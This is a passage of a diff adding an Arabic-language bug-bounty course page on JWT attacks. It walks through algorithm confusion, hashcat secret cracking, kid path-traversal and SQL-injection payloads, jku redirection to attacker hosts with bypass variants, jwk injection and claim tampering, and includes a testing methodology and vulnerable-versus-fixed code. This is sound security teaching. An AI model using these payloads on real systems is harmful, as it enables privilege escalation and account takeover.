+                    بيستخدم الـ public key كـ HMAC secret. المهاجم عنده الـ public key — يعمل نفس الـ HMAC —
+                    signature صح!</div>
+            </div>
+        </div>
+        <div class="cb rev">
+            <span class="cb-lbl">// STEP 1: GET THE PUBLIC KEY</span>
+            <span class="t">GET</span> <span class="w">/.well-known/jwks.json</span>
+            <span class="m">// Response:</span>
+            {
+            <span class="g">"keys"</span>: [{
+            <span class="g">"kty"</span>: <span class="y">"RSA"</span>,
+            <span class="g">"use"</span>: <span class="y">"sig"</span>,
+            <span class="g">"n"</span>: <span class="y">"0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWh..."</span>,
+            <span class="g">"e"</span>: <span class="y">"AQAB"</span>
+            }]
+            }
+
+            <span class="cb-lbl" style="margin-top:1.5rem">// STEP 2: CONVERT TO PEM FORMAT</span>
+            <span class="m">// Use jwt_tool or Burp JWT Editor extension:</span>
+            -----BEGIN PUBLIC KEY-----
+            MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0vx7...
+            -----END PUBLIC KEY-----
+
+            <span class="cb-lbl" style="margin-top:1.5rem">// STEP 3: SIGN WITH HS256 USING PUBLIC KEY AS
+                SECRET</span>
+            <span class="m">// jwt_tool command:</span>
+            <span class="t">python3</span> <span class="w">jwt_tool.py</span> <span
+                class="r">&lt;original_jwt&gt;</span> <span class="y">-X k</span> <span class="y">-pk</span> <span
+                class="w">public_key.pem</span>
+
+            <span class="m">// Or Burp Suite → JWT Editor → Attack → Sign with RS/ECDSA Key</span>
+
+            <span class="cb-lbl" style="margin-top:1.5rem">// STEP 4: RESULT — TAMPERED TOKEN ACCEPTED BY
+                SERVER</span>
+            <span class="m">// Modified payload: {"role": "admin"} → signed with public key as HMAC</span>
+            <span class="gr">// Server verifies with public key as HMAC secret → MATCH ✅</span>
+            <span class="r">// Admin access achieved!</span>
+        </div>
+        <div class="vf-grid rev" style="margin-top:2rem">
+            <div class="vf-vuln">
+                <div class="vf-head">❌ الـ Vulnerable Code (Node.js)</div>
+                <div class="vf-body">
+                    <span class="m">// DANGEROUS — uses header's alg</span>
+                    <span class="t">const</span> <span class="w">payload</span> = <span class="t">jwt.verify</span>(
+                    token,
+                    publicKey, <span class="r">← same key always</span>
+                    <span class="m">// no algorithm specified!</span>
+                    );
+                    <span class="r">// alg from header is trusted blindly</span>
+                </div>
+            </div>
+            <div class="vf-fix">
+                <div class="vf-head">✅ الـ Fixed Code</div>
+                <div class="vf-body">
+                    <span class="m">// SAFE — algorithm hardcoded</span>
+                    <span class="t">const</span> <span class="w">payload</span> = <span class="t">jwt.verify</span>(
+                    token,
+                    publicKey,
+                    { <span class="g">algorithms</span>: [<span class="w">'RS256'</span>] }
+                    <span class="g">// HS256 will be REJECTED</span>
+                    );
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S8: WEAK SECRETS ═══ -->
+<section class="section" id="s8">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 08 — الـ Offline Attack</div>
+            <h2 class="sec-title">Weak Secrets — <em>Hashcat Brute Force</em></h2>
+            <p class="sec-desc">الـ HS256 signature يمكن كسره offline. كل اللي محتاجه JWT واحد صح وwordlist.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="sb rev">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — ليه الـ Offline Attack خطير</span><span
+                    class="sb-time">100:00 – 118:00</span></div>
+            <div class="sb-body">
+                <p>الـ JWT signature بيمكن التحقق منه <span class="hl">offline</span>. يعني مش محتاج تبعت requests
+                    للـ server عشان تعرف لو الـ secret صح. ده معناه:</p>
+                <p>تاخد JWT واحد صح من الـ traffic، وتجرب millions من الـ secrets في الثانية بالـ hashcat. الـ
+                    server مش بيعرف وما فيش rate limiting هنا.</p>
+                <div class="nb">🏎️ Hashcat بيتشغل على الـ GPU — يعني ممكن يجرب مليارات من الـ HMAC computations في
+                    الثانية. الـ wordlists المتخصصة زي SecLists/jwt.secrets.list بتحتوي على أشهر الـ weak secrets.
+                </div>
+            </div>
+        </div>
+        <div class="cb rev">
+            <span class="cb-lbl">// STEP 1: EXTRACT JWT FROM BURP</span>
+            <span class="m">// Copy the full JWT token from Authorization header</span>
+            <span
+                class="w">JWT=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI4ODAifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span>
+
+            <span class="cb-lbl" style="margin-top:1.5rem">// STEP 2: HASHCAT COMMAND</span>
+            <span class="m">// Mode 16500 = JWT (HS256/384/512)</span>
+            <span class="t">hashcat</span> <span class="y">-a 0</span> <span class="y">-m 16500</span> <span
+                class="w">$JWT</span> <span class="w">/path/to/wordlist.txt</span>
+
+            <span class="m">// Common wordlists:</span>
+            <span class="m">// /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt</span>
+            <span class="m">// /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt</span>
+            <span class="m">// jwt.secrets.list (specialized for JWT)</span>
+
+            <span class="m">// Show results if already cracked:</span>
+            <span class="t">hashcat</span> <span class="y">-a 0</span> <span class="y">-m 16500</span> <span
+                class="w">$JWT</span> <span class="w">wordlist.txt</span> <span class="y">--show</span>
+
+            <span class="cb-lbl" style="margin-top:1.5rem">// STEP 3: EXAMPLE OUTPUT (CRACKED!)</span>
+            <span class="r">eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI4ODAifQ.SflK...:secret</span>
+            <span class="m"> ↑ Found secret key!</span>
+
+            <span class="cb-lbl" style="margin-top:1.5rem">// STEP 4: FORGE TOKEN WITH CRACKED SECRET</span>
+            <span class="m">// Now use jwt.io or jwt_tool to sign a new token:</span>
+            <span class="t">python3</span> <span class="w">jwt_tool.py</span> <span
+                class="r">&lt;original_jwt&gt;</span> <span class="y">-T</span> <span class="y">-S hs256</span>
+            <span class="y">-p</span> <span class="y">"secret"</span>
+            <span class="m">// -T = tamper mode (choose claims to modify)</span>
+            <span class="m">// -S hs256 = sign with HS256</span>
+            <span class="m">// -p = the cracked password/secret</span>
+        </div>
+        <div class="g2 rev" style="margin-top:2rem">
+            <div class="card cr">
+                <div class="clabel">أشهر الـ Weak Secrets في Production</div>
+                <div class="cb" style="font-size:.66rem;margin-top:.8rem">
+                    <span class="r">secret</span> <span class="m">← أشهرهم</span>
+                    <span class="r">secret123</span> <span class="m">← developer lazy</span>
+                    <span class="r">jwt_secret</span> <span class="m">← variable name as value</span>
+                    <span class="r">your-256-bit-secret</span> <span class="m">← copy-paste from docs</span>
+                    <span class="r">supersecret</span>
+                    <span class="r">changethis</span>
+                    <span class="r">admin</span>
+                    <span class="r">password</span>
+                    <span class="r">1234567890</span>
+                    <span class="r">key</span>
+                </div>
+            </div>
+            <div class="card cr">
+                <div class="clabel">الـ Wordlists المتخصصة</div>
+                <ul class="cl">
+                    <li><span class="tg">Tool</span> jwt.secrets.list من PortSwigger Labs</li>
+                    <li><span class="tg">Tool</span> SecLists/Passwords/JWT</li>
+                    <li><span class="tg">Tool</span> rockyou.txt (أشهر wordlist)</li>
+                    <li><span class="tg">Tool</span> jwt_tool.py مع auto wordlist</li>
+                    <li><span class="tg">Tip</span> ابدأ بأصغر wordlist أسرع</li>
+                    <li><span class="tg">Tip</span> بعدين روح لـ rockyou</li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S9: HEADER INJECTIONS ═══ -->
+<section class="section" id="s9">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 09 — Header Parameters</div>
+            <h2 class="sec-title">Header Injections — <em>kid / jku / jwk</em></h2>
+            <p class="sec-desc">الـ JWT header بيحتوي على parameters بيستخدمها الـ server لإيجاد الـ key — وكلها
+                attack vectors.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="sb rev">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — الـ Header Parameters المخطرة</span><span
+                    class="sb-time">118:00 – 150:00</span></div>
+            <div class="sb-body">
+                <p>الـ JWT header مش بس بيحتوي على <span class="ic">alg</span>. في parameters تانية زي <span
+                        class="hl">kid</span> (Key ID) و<span class="hl">jku</span> (JWK Set URL) و<span
+                        class="hl">jwk</span> (JSON Web Key). كلها بيستخدمها الـ server عشان يجيب الـ key اللي
+                    هيتحقق بيه من الـ signature.</p>
+                <p>الـ vulnerability: لو الـ server بيثق في القيم دي من الـ token من غير validation — المهاجم يقدر
+                    يوجهه لـ key بتاعه هو.</p>
+            </div>
+        </div>
+
+        <div class="attack-box rev" style="margin-top:1.5rem">
+            <div class="attack-hd"><span class="attack-name">🗝️ KID PATH TRAVERSAL</span><span
+                    class="attack-sev sev-crit">CRITICAL</span></div>
+            <div class="attack-body">
+                <p>الـ <span class="ic">kid</span> (Key ID) parameter بيقول للـ server أي key يستخدم. لو الـ server
+                    بيجيب الـ key من الـ filesystem بناءً على الـ kid — Path Traversal ممكن.</p>
+                <div class="cb" style="margin-top:1rem">
+                    <span class="cb-lbl">// NORMAL KID USAGE</span>
+                    <span class="g">"kid"</span>: <span class="y">"key-2024-01"</span>
+                    <span class="m">// Server: reads /keys/key-2024-01 from filesystem</span>
+
+                    <span class="cb-lbl" style="margin-top:1.5rem">// PATH TRAVERSAL ATTACK</span>
+                    <span class="g">"kid"</span>: <span class="y">"../../../../dev/null"</span>
+                    <span class="m">// Server: reads /dev/null → empty string</span>
+                    <span class="m">// Attacker signs token with "" (empty string) as secret</span>
+                    <span class="gr">// Server verifies with empty string → MATCH ✅</span>
+
+                    <span class="cb-lbl" style="margin-top:1.5rem">// SIGN WITH EMPTY SECRET</span>
+                    <span class="t">python3</span> <span class="w">jwt_tool.py</span> <span
+                        class="r">&lt;token&gt;</span> <span class="y">-T</span> <span class="y">-S hs256</span>
+                    <span class="y">-p</span> <span class="y">""</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="attack-box rev">
+            <div class="attack-hd"><span class="attack-name">💉 KID SQL INJECTION</span><span
+                    class="attack-sev sev-crit">CRITICAL</span></div>
+            <div class="attack-body">
+                <p>لو الـ server بيعمل SQL query بالـ kid عشان يجيب الـ key من DB — SQL Injection ممكن عشان يرجع key
+                    معروف.</p>
+                <div class="cb" style="margin-top:1rem">
+                    <span class="cb-lbl">// SERVER-SIDE VULNERABLE CODE</span>
+                    <span class="m">// query = "SELECT key FROM jwt_keys WHERE id = '" + kid + "'"</span>
+
+                    <span class="cb-lbl" style="margin-top:1rem">// ATTACK — INJECT SQL TO RETURN KNOWN VALUE</span>
+                    <span class="g">"kid"</span>: <span class="y">"xxx' UNION SELECT 'attacker_secret'-- -"</span>
+                    <span class="m">// Query becomes:</span>
+                    <span class="m">// SELECT key FROM jwt_keys WHERE id = 'xxx'</span>
+                    <span class="m">// UNION SELECT 'attacker_secret'-- -</span>
+                    <span class="m">// → Returns: 'attacker_secret'</span>
+
+                    <span class="m">// Sign token with 'attacker_secret' as HS256 secret:</span>
+                    <span class="t">python3</span> <span class="w">jwt_tool.py</span> <span
+                        class="r">&lt;token&gt;</span> <span class="y">-T</span> <span class="y">-S hs256</span>
+                    <span class="y">-p</span> <span class="y">"attacker_secret"</span>
+                    <span class="gr">// Server verifies → 'attacker_secret' == 'attacker_secret' ✅</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="attack-box rev">
+            <div class="attack-hd"><span class="attack-name">🌐 JKU INJECTION — JWK Set URL</span><span
+                    class="attack-sev sev-crit">CRITICAL</span></div>
+            <div class="attack-body">
+                <p>الـ <span class="ic">jku</span> parameter بيقول للـ server يجيب الـ public key من URL معين. لو
+                    الـ server فتح الـ URL من غير whitelist — المهاجم بيستضيف الـ key بتاعه على server تاني.</p>
+                <div class="cb" style="margin-top:1rem">
+                    <span class="cb-lbl">// LEGITIMATE JKU</span>
+                    <span class="g">"jku"</span>: <span class="y">"https://target.com/.well-known/jwks.json"</span>
+
+                    <span class="cb-lbl" style="margin-top:1rem">// ATTACK — REDIRECT TO ATTACKER'S JWKS</span>
+                    <span class="g">"jku"</span>: <span class="y">"https://attacker.com/evil-jwks.json"</span>
+                    <span class="m">// Server fetches jwks.json from attacker's server</span>
+                    <span class="m">// Attacker hosts a jwks.json with their own public key</span>
+                    <span class="m">// Token is signed with attacker's matching private key</span>
+                    <span class="gr">// Server: fetches attacker key → verifies → MATCH ✅</span>
+
+                    <span class="cb-lbl" style="margin-top:1rem">// BYPASS DOMAIN RESTRICTIONS</span>
+                    <span class="g">"jku"</span>: <span class="y">"https://target.com@attacker.com/evil.json"</span>
+                    <span class="g">"jku"</span>: <span class="y">"https://target.com.attacker.com/evil.json"</span>
+                    <span class="g">"jku"</span>: <span
+                        class="y">"https://attacker.com/evil.json?x=https://target.com"</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="attack-box rev">
+            <div class="attack-hd"><span class="attack-name">🔑 JWK HEADER INJECTION — Embedded Key</span><span
+                    class="attack-sev sev-crit">CRITICAL</span></div>
+            <div class="attack-body">
+                <p>الـ <span class="ic">jwk</span> parameter بيسمح بتضمين الـ public key في الـ header نفسه. لو الـ
+                    server قبل الـ key من الـ header من غير whitelist — المهاجم يضمن الـ key بتاعه.</p>
+                <div class="cb" style="margin-top:1rem">
+                    <span class="cb-lbl">// ATTACK — EMBED ATTACKER'S PUBLIC KEY IN HEADER</span>
+                    {
+                    <span class="g">"alg"</span>: <span class="y">"RS256"</span>,
+                    <span class="g">"typ"</span>: <span class="y">"JWT"</span>,
+                    <span class="g">"jwk"</span>: {
+                    <span class="g">"kty"</span>: <span class="y">"RSA"</span>,
+                    <span class="g">"kid"</span>: <span class="y">"attacker-key-id"</span>,
+                    <span class="g">"use"</span>: <span class="y">"sig"</span>,
+                    <span class="g">"n"</span>: <span class="y">"attacker's public key modulus..."</span>,
+                    <span class="g">"e"</span>: <span class="y">"AQAB"</span>
+                    }
+                    }
+                    <span class="m">// Token signed with attacker's PRIVATE key</span>
+                    <span class="m">// Server reads PUBLIC key from jwk header</span>
+                    <span class="gr">// Verifies with embedded key → MATCH ✅</span>
+
+                    <span class="m">// Burp Suite → JWT Editor extension → Embedded JWK attack (1 click)</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S10: CLAIM MANIPULATION ═══ -->
+<section class="section" id="s10">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 10 — Payload Attacks</div>
+            <h2 class="sec-title">Claim Manipulation — <em>تزوير الـ Payload</em></h2>
+            <p class="sec-desc">لما تكسر الـ signature validation — الـ claims بقت ملعب بتاعك. كل claim فيه impact
+                مختلف.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="g2 rev" style="margin-bottom:1.5rem">
+            <div class="card cr">
+                <div class="clabel">🎯 ROLE / PERMISSION CLAIMS — الـ Impact الأعلى</div>
+                <h3>Vertical Privilege Escalation</h3>
+                <div class="cb" style="font-size:.67rem;margin-top:.8rem">
+                    <span class="cb-lbl">// BEFORE (original payload)</span>
+                    {
+                    <span class="g">"userId"</span>: <span class="y">"8800327"</span>,
+                    <span class="g">"role"</span>: <span class="r">"user"</span>,
+                    <span class="g">"exp"</span>: <span class="w">1732086400</span>
+                    }
+
+                    <span class="cb-lbl" style="margin-top:1rem">// AFTER (tampered)</span>
+                    {
+                    <span class="g">"userId"</span>: <span class="y">"8800327"</span>,
+                    <span class="g">"role"</span>: <span class="gr">"admin"</span>, <span class="m">←
+                        escalated!</span>
+                    <span class="g">"isAdmin"</span>: <span class="gr">true</span>, <span class="m">← check all
+                        boolean flags</span>
+                    <span class="g">"exp"</span>: <span class="w">9999999999</span> <span class="m">← never
+                        expires</span>
+                    }
+                </div>
+            </div>
+            <div class="card cr">
+                <div class="clabel">👤 USER ID / SUB CLAIMS — Account Takeover</div>
+                <h3>Horizontal Privilege Escalation</h3>
+                <div class="cb" style="font-size:.67rem;margin-top:.8rem">
+                    <span class="cb-lbl">// BEFORE (your account)</span>
+                    {
+                    <span class="g">"sub"</span>: <span class="y">"8800327"</span>, <span class="m">← your ID</span>
+                    <span class="g">"email"</span>: <span class="y">"you@test.com"</span>
+                    }
+
+                    <span class="cb-lbl" style="margin-top:1rem">// AFTER (victim's account)</span>
+                    {
+                    <span class="g">"sub"</span>: <span class="r">"1"</span>, <span class="m">← admin ID
+                        usually</span>
+                    <span class="g">"email"</span>: <span class="r">"admin@corp.com"</span> <span class="m">←
+                        guessed</span>
+                    }
+                    <span class="m">// Or enumerate: sub: 1, 2, 3, 4...</span>
+                </div>
+            </div>
+        </div>
+        <div class="g2 rev">
+            <div class="card cr">
+                <div class="clabel">⏰ EXPIRATION CLAIM — Token Eternal</div>
+                <h3>Session Persistence Attack</h3>
+                <div class="cb" style="font-size:.67rem;margin-top:.8rem">
+                    <span class="cb-lbl">// MANIPULATION</span>
+                    <span class="g">"exp"</span>: <span class="w">1732086400</span> <span class="m">← current
+                        (expires tomorrow)</span>
+                    <span class="g">"exp"</span>: <span class="r">9999999999</span> <span class="m">← year 2286
+                        (never expires)</span>
+                    <span class="g">"exp"</span>: <span class="r">null</span> <span class="m">← some libs skip null
+                        check</span>
+                    <span class="g">"exp"</span>: <span class="r">-1</span> <span class="m">← negative (edge case
+                        test)</span>
+
+                    <span class="m">// Also test: remove exp entirely</span>
+                    <span class="m">// {"sub":"123","role":"admin"} ← no exp field</span>
+                </div>
+            </div>
+            <div class="card cr">
+                <div class="clabel">🏢 TENANT / SCOPE CLAIMS</div>
+                <h3>Cross-Tenant Access</h3>
+                <div class="cb" style="font-size:.67rem;margin-top:.8rem">
+                    <span class="cb-lbl">// MULTI-TENANT BYPASS</span>
+                    <span class="g">"tenantId"</span>: <span class="y">"tenant_abc"</span> <span class="m">←
+                        yours</span>
+                    <span class="g">"tenantId"</span>: <span class="r">"tenant_xyz"</span> <span class="m">←
+                        competitor!</span>
+
+                    <span class="m">// Scope manipulation:</span>
+                    <span class="g">"scope"</span>: <span class="y">"read"</span>
+                    <span class="g">"scope"</span>: <span class="r">"read write delete admin"</span>
+
+                    <span class="m">// Audience bypass:</span>
+                    <span class="g">"aud"</span>: <span class="y">"api-service"</span>
+                    <span class="g">"aud"</span>: <span class="r">"admin-service"</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S11: DECODE VS VERIFY ═══ -->
+<section class="section" id="s11">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 11 — الـ Fatal Mistake</div>
+            <h2 class="sec-title">decode() <em>vs</em> verify() — الخطأ القاتل</h2>
+            <p class="sec-desc">الفرق بين الاتنين هو كل الفرق. كتير من الـ developers بيخلطوا بينهم — وده بيلغي الـ
+                security كلها.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="vf-grid rev">
+            <div class="vf-vuln">
+                <div class="vf-head">❌ decode() — بدون verification</div>
+                <div class="vf-body">
+                    <span class="m">// DANGEROUS — Node.js jsonwebtoken</span>
+                    <span class="t">const</span> <span class="w">decoded</span> = <span
+                        class="t">jwt.decode</span>(token);
+                    <span class="r">// ← NO signature check!</span>
+                    <span class="r">// ← Accepts ANY token</span>
+                    <span class="r">// ← Even forged ones</span>
+
+                    <span class="t">const</span> <span class="w">userId</span> = decoded.userId;
+                    <span class="r">// userId can be ANYTHING</span>
+                    <span class="r">// attacker controls this!</span>
+
+                    <span class="m">// Python PyJWT equivalent:</span>
+                    <span class="t">jwt.decode</span>(token,
+                    options={<span class="r">"verify_signature": False</span>})
+                </div>
+            </div>
+            <div class="vf-fix">
+                <div class="vf-head">✅ verify() — مع Signature Check</div>
+                <div class="vf-body">
+                    <span class="m">// SAFE — Node.js jsonwebtoken</span>
+                    <span class="t">const</span> <span class="w">decoded</span> = <span class="t">jwt.verify</span>(
+                    token,
+                    <span class="g">process.env.JWT_SECRET</span>,
+                    { <span class="g">algorithms</span>: [<span class="w">'HS256'</span>] }
+                    );
+                    <span class="g">// ← Signature verified ✅</span>
+                    <span class="g">// ← Algorithm enforced ✅</span>
+                    <span class="g">// ← Expiry checked ✅</span>
+
+                    <span class="m">// Python PyJWT:</span>
+                    <span class="t">jwt.decode</span>(token,
+                    secret, algorithms=[<span class="g">'HS256'</span>])
+                </div>
+            </div>
+        </div>
+        <div class="sb rev" style="margin-top:2rem">
+            <div class="sb-hd"><span class="sb-type">// SCRIPT — اكتشاف الـ decode() Fallacy في Code
+                    Review</span><span class="sb-time">150:00 – 162:00</span></div>
+            <div class="sb-body">
+                <p>لما بتعمل code review أو لما بيكون عندك source code — دور على <span class="hl">jwt.decode(</span>
+                    بدل <span class="hl2">jwt.verify(</span>. في JavaScript: <span class="ic">decode</span> مش آمن
+                    بدون <span class="ic">verify</span>. في Python: <span class="ic">options={"verify_signature":
+                        False}</span> خطر.</p>
+                <div class="nb">🔍 في الـ Bug Bounty: لو قدرت تعمل تعديل في الـ payload وما اتبلوكتش — ده دليل واضح
+                    إن الـ decode() بيتاستخدم بدل الـ verify(). جرب تغير الـ role أو الـ userId وشوف الـ response.
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S12: 8-STEP METHODOLOGY ═══ -->
+<section class="section" id="s12">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 12 — الـ Methodology الكاملة</div>
+            <h2 class="sec-title">JWT Testing — <em>8 خطوات منهجية</em></h2>
+            <p class="sec-desc">من اللحظة اللي تشوف فيها JWT في الـ Burp لحد ما تكتب الـ report — كل خطوة بالترتيب.
+            </p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+        <div class="step rev">
+            <div class="sn">I</div>
+            <div class="sc">
+                <h4>اكتشاف الـ JWT في الـ Traffic</h4>
+                <p>افتح Burp Suite وابحث عن الـ pattern <span class="ic">eyJ</span> في الـ headers والـ cookies. دي
+                    الـ signature بتاعة كل JWT. في Burp → Target → Site Map → Search لـ "eyJ". كمان ابحث في الـ
+                    Response headers لأن بعض التطبيقات بتعمل token rotation.</p>
+            </div>
+        </div>
+        <div class="step rev">
+            <div class="sn">II</div>
+            <div class="sc">
+                <h4>Decode والـ Analysis</h4>
+                <p>افتح jwt.io أو استخدم الـ Burp JWT Editor extension. وثق في الـ notes: الـ algorithm، كل الـ
+                    claims في الـ header والـ payload، وخصوصاً الـ role وuser ID claims. ابحث عن sequential IDs في
+                    الـ sub/userId.</p>
+            </div>
+        </div>
+        <div class="step rev">
+            <div class="sn">III</div>
+            <div class="sc">
+                <h4>Test Signature Validation</h4>
+                <p>في Burp Repeater: شيل آخر حرف من الـ signature وبعت الـ request. لو 200 → signature not validated
+                    → الـ payload مفتوح للتعديل المباشر. لو 401 → validated → انتقل للـ attacks التانية.</p>
+            </div>
+        </div>
+        <div class="step rev">
+            <div class="sn">IV</div>
+            <div class="sc">
+                <h4>None Algorithm Attack</h4>
+                <p>غير الـ header لـ <span class="ic">{"alg":"none"}</span>، غير الـ payload، واشيل الـ signature مع
+                    الاحتفاظ بالـ trailing dot. جرب كل الـ variations: "None"، "NONE"، "nOnE". استخدم Burp JWT
+                    Editor → Attack → None Algorithm.</p>
+            </div>
+        </div>
+        <div class="step rev">
+            <div class="sn">V</div>
+            <div class="sc">
+                <h4>Algorithm Confusion (لو RS256)</h4>
+                <p>جيب الـ public key من <span class="ic">/.well-known/jwks.json</span> أو الـ endpoint المعروفة.
+                    حول الـ alg لـ HS256. وقع الـ token بالـ HMAC-SHA256 باستخدام الـ public key كـ secret. استخدم
+                    jwt_tool.py -X k أو Burp JWT Editor.</p>
+            </div>
+        </div>
+        <div class="step rev">
+            <div class="sn">VI</div>
+            <div class="sc">
+                <h4>Weak Secret Brute Force (لو HS256)</h4>
+                <p>استخدم hashcat -a 0 -m 16500 مع أشهر الـ wordlists. ابدأ بالـ jwt.secrets.list ثم rockyou. لو
+                    اتكسر الـ secret — اعمل token بأي claims عايزها.</p>
+            </div>
+        </div>
+        <div class="step rev">
+            <div class="sn">VII</div>
+            <div class="sc">
+                <h4>Header Parameter Injections</h4>
+                <p>لو في <span class="ic">kid</span>: جرب path traversal <span class="ic">../../../../dev/null</span>
+                    وSQL injection. لو في <span class="ic">jku</span>:
+                    حاول توجهه لـ server بتاعك. لو في <span class="ic">jwk</span>: استخدم Burp JWT Editor → Embedded
+                    JWK attack.</p>
+            </div>
+        </div>
+        <div class="step rev">
+            <div class="sn">VIII</div>
+            <div class="sc">
+                <h4>Claim Manipulation والـ Impact Proof</h4>
+                <p>بعد ما قدرت تزور الـ token: غير الـ role لـ admin، غير الـ sub لـ ID تاني، ارفع الـ exp. وثق الـ
+                    PoC بالـ screenshots وكتب الـ report مع الـ impact الكامل.</p>
+            </div>
+        </div>
+
+        <div class="nt rev" style="margin-top:2.5rem">
+            <div
+                style="font-family:'Cinzel',serif;font-size:.5rem;letter-spacing:.18em;color:var(--rdim);margin-bottom:1rem">
+                // JWT TESTING NOTES TEMPLATE</div>
+            <span class="h1"># [TARGET] — JWT SECURITY TESTING</span>
+
+            <span class="h2">## Token Discovery</span>
+            <span class="k">Location: </span> <span class="v">Authorization: Bearer (header)</span>
+            <span class="k">Endpoint: </span> <span class="v">POST /api/auth/login</span>
+            <span class="k">Used on: </span> <span class="v">/api/dashboard, /api/user/*, /api/admin/*</span>
+
+            <span class="h2">## Token Analysis</span>
+            <span class="k">Algorithm: </span> <span class="v">HS256</span> <span class="dm">← target for weak
+                secret + alg confusion</span>
+            <span class="k">Header claims: </span> <span class="v">{"alg":"HS256","typ":"JWT"}</span>
+            <span class="k">Payload claims:</span> <span
+                class="v">{"userId":"8800327","role":"user","exp":1732086400}</span>
+            <span class="k">Sub/UserID: </span> <span class="warn">8800327 ← is it sequential? Check A2 for
+                comparison</span>
+
+            <span class="h2">## Tests Performed</span>
+            <span class="k">Sig Validation:</span> <span class="fl">FAILED</span> <span class="dm">← removed last
+                char → still 200 OK ⚡</span>
+            <span class="k">None attack: </span> <span class="ok">BLOCKED</span> <span class="dm">← 401 with
+                alg:none</span>
+            <span class="k">Weak secret: </span> <span class="warn">RUNNING</span> <span class="dm">← hashcat
+                running with rockyou.txt</span>
+            <span class="k">Alg confusion: </span> <span class="dm">N/A ← HS256, not RS256</span>
+            <span class="k">Claim manip: </span> <span class="fl">SUCCESS</span> <span class="dm">← changed role to
+                admin → admin panel access ✅</span>
+
+            <span class="h2">## Impact</span>
+            <span class="warn">CRITICAL: Signature not validated on /api/admin/* endpoints</span>
+            <span class="warn">Any user can forge admin JWT and access admin panel</span>
+        </div>
+    </div>
+</section>
+
+<!-- ═══ S13: DECISION TREES ═══ -->
+<section class="section" id="s13">
+    <div class="container">
+        <div class="rev">
+            <div class="sec-eye">// 13 — خرائط القرار</div>
+            <h2 class="sec-title">Decision Trees — <em>كل قرار له مساره</em></h2>
+            <p class="sec-desc">من لحظة ما تشوف JWT لحد ما تكتب الـ report — كل decision له tree.</p>
+        </div>
+        <div class="ornament">◆ ◇ ◆</div>
+
+        <div class="dt rev" style="margin-bottom:2rem">
+            <div class="dt-lbl">// MASTER JWT HUNTING TREE</div>
+            <div style="direction:ltr">
+                <div class="dt-row"><span style="color:var(--rdim)">◆</span><span class="dq dn">Found JWT in traffic
+                        — start here</span></div>
+                <div class="di">
+                    <p
+                        style="color:var(--muted);font-family:'Cinzel',serif;font-size:.52rem;letter-spacing:.12em;margin:.8rem 0 .4rem">
+                        PHASE 1 — SIGNATURE VALIDATION TEST</p>
+                    <div class="dt-row"><span class="darr">→</span><span class="dq dn">Remove last sig char →
+                            send</span></div>
+                    <div class="di">
+                        <div class="dt-row"><span class="dy dn">200 OK</span><span class="darr">→</span><span
+                                class="dr2 dn">⚡ NOT validated!</span><span class="darr">→</span><span
+                                class="da dn">Change any claim freely → DONE</span></div>
+                        <div class="dt-row"><span class="dn-ok dn">401</span><span class="darr">→</span><span
+                                class="da dn">Validated → continue to Phase 2</span></div>
+                    </div>
+
+                    <p
+                        style="color:var(--muted);font-family:'Cinzel',serif;font-size:.52rem;letter-spacing:.12em;margin:.8rem 0 .4rem">
+                        PHASE 2 — NONE ALGORITHM ATTACK</p>
+                    <div class="dt-row"><span class="darr">→</span><span class="dq dn">Set alg:none, strip
+                            signature, keep trailing dot</span></div>
+                    <div class="di">
+                        <div class="dt-row"><span class="dy dn">200 OK</span><span class="darr">→</span><span
+                                class="dr2 dn">⚡ None accepted!</span><span class="darr">→</span><span
+                                class="da dn">Modify payload freely → DONE</span></div>
+                        <div class="dt-row"><span class="dn-ok dn">401</span><span class="darr">→</span><span
+                                class="da dn">Try "None", "NONE", "" variations → continue</span></div>
+                    </div>
+
+                    <p
+                        style="color:var(--muted);font-family:'Cinzel',serif;font-size:.52rem;letter-spacing:.12em;margin:.8rem 0 .4rem">
+                        PHASE 3 — ALGORITHM BRANCH</p>
+                    <div style="display:flex;gap:1.5rem;flex-wrap:wrap;margin-top:.8rem">
+                        <div style="border:1px solid rgba(220,38,38,.2);padding:.9rem;min-width:200px">
+                            <p
+                                style="color:var(--red);font-family:'Cinzel',serif;font-size:.52rem;letter-spacing:.1em;margin-bottom:.7rem">
+                                IF HS256 BRANCH</p>
+                            <div class="dt-row"><span class="darr">→</span><span class="da dn">Hashcat brute
+                                    force</span></div>
+                            <div class="dt-row"><span class="dy dn">Cracked</span><span class="darr">→</span><span
+                                    class="dr2 dn">Sign any token ✅</span></div>
+                            <div class="dt-row"><span class="dn-ok dn">Failed</span><span class="darr">→</span><span
+                                    class="da dn">Check kid/other headers</span></div>
+                        </div>
+                        <div style="border:1px solid rgba(90,154,138,.2);padding:.9rem;min-width:200px">
+                            <p
+                                style="color:var(--teal);font-family:'Cinzel',serif;font-size:.52rem;letter-spacing:.1em;margin-bottom:.7rem">
